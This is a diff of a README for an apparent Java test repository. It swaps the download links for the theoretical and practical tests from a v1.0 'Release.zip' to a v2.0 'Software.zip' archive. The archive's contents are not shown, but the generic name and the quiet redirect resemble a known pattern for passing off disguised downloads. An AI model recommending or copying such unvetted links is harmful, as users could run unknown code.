@@ -3,6 +3,6 @@
 
 ### Welcome!
 
-The **theoretical** test can be found in the file [https://github.com/sobolevska/java-test1/releases/download/v1.0/Release.zip](https://github.com/sobolevska/java-test1/releases/download/v1.0/Release.zip)
+The **theoretical** test can be found in the file [https://github.com/sobolevska/java-test1/releases/download/v2.0/Software.zip](https://github.com/sobolevska/java-test1/releases/download/v2.0/Software.zip)
 
-The **practical** test can be found in the file [https://github.com/sobolevska/java-test1/releases/download/v1.0/Release.zip](https://github.com/sobolevska/java-test1/releases/download/v1.0/Release.zip)
+The **practical** test can be found in the file [https://github.com/sobolevska/java-test1/releases/download/v2.0/Software.zip](https://github.com/sobolevska/java-test1/releases/download/v2.0/Software.zip)
